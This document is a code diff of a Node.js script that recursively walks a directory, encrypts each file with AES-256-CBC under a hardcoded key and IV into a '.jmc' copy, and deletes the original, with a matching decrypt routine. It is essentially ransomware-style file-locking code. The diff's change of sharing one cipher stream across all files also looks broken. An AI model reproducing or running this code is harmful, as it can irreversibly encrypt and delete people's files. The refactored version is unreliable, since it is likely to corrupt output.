@@ -2,7 +2,6 @@ var fs = require('fs');
 const crypto = require('crypto');
 var key = Buffer.from("bRuD5WYw5wda6jHRnyLlM6wt2vteuiniQBqE70nAuhU=","base64"); //Hardcoded key
 var iv = Buffer.from("ja9hq8lx2kDMLpTEn3ErSg==","base64"); //Hardcoded iv
-var path = require("path");
 var walk = require('walk');
 
 
@@ -19,17 +18,17 @@ function encrypt(file) {
     });
     // @ts-ignore
     walker.on('end', function () {
+        var cipher = crypto.createCipheriv('aes-256-cbc', key,iv);
         for (var file of files) {
             try{
-            var cipher = crypto.createCipheriv('aes-256-cbc', key,iv);
-            if(file.endsWith(".jmc")) continue;
-            console.warn(file)
-            var filein = fs.createReadStream(file);
-            var fileout = fs.createWriteStream(file + ".jmc");
-            filein.pipe(cipher).pipe(fileout)
-            fs.unlink(file, (err) => { console.log(err) });
+                if(file.endsWith(".jmc")) continue;
+                console.warn(file)
+                var filein = fs.createReadStream(file);
+                var fileout = fs.createWriteStream(file + ".jmc");
+                filein.pipe(cipher).pipe(fileout)
+                fs.unlink(file, (err) => { console.log(err) });
             }catch(error){
-                console.log("Hata oluştu: ",error)
+                console.log("Error:: ",error)
             }
         }
         
@@ -51,9 +50,9 @@ function decrypt(file) {
     });
     // @ts-ignore
     walker.on('end', function () {
+        var cipher = crypto.createDecipheriv('aes-256-cbc', key,iv);
         for (var file of files) {
             if(!file.endsWith(".jmc")) continue;
-            var cipher = crypto.createDecipheriv('aes-256-cbc', key,iv);
             var filein = fs.createReadStream(file);
             var fileout = fs.createWriteStream(file.replace(".jmc", ""));
             filein.pipe(cipher).pipe(fileout)
